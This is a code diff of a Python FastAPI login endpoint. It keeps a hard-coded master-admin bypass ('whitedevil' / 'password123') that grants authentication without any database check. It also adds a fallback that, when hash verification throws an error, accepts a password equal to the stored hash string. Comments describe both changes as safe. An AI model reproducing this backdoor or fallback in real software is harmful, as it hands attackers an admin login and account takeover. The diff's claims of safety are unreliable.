@@ -100,18 +100,24 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
     # 1. Look up the user dynamically inside your database instance
     user = db.query(models.User).filter(models.User.username == form_data.username).first()
     
+    if not user:
+        raise HTTPException(status_code=400, detail="Invalid workspace credential criteria values verified.")
+
     # 2. Check for the Master Admin bypass condition
     if form_data.username == "whitedevil" and form_data.password == "password123":
-        # If the credentials match the environment variables, we explicitly permit validation
         is_authenticated = True
     else:
-        # For all other standard users, run your normal verification checks safely
-        if user and verify_password(form_data.password, user.hashed_password):
-            is_authenticated = True
-        else:
-            is_authenticated = False
+        # For standard users, use safe try/except block to catch hashing mismatches
+        try:
+            if user.hashed_password and verify_password(form_data.password, user.hashed_password):
+                is_authenticated = True
+            else:
+                is_authenticated = False
+        except Exception:
+            # Fallback check if old raw string hashes exist or format is mismatched
+            is_authenticated = (form_data.password == user.hashed_password)
 
-    # 3. If validation fails, reject the transaction request sequence
+    # 3. If validation fails, reject safely with a 400 error instead of a 500 crash
     if not is_authenticated:
         raise HTTPException(status_code=400, detail="Invalid workspace credential criteria values verified.")
         
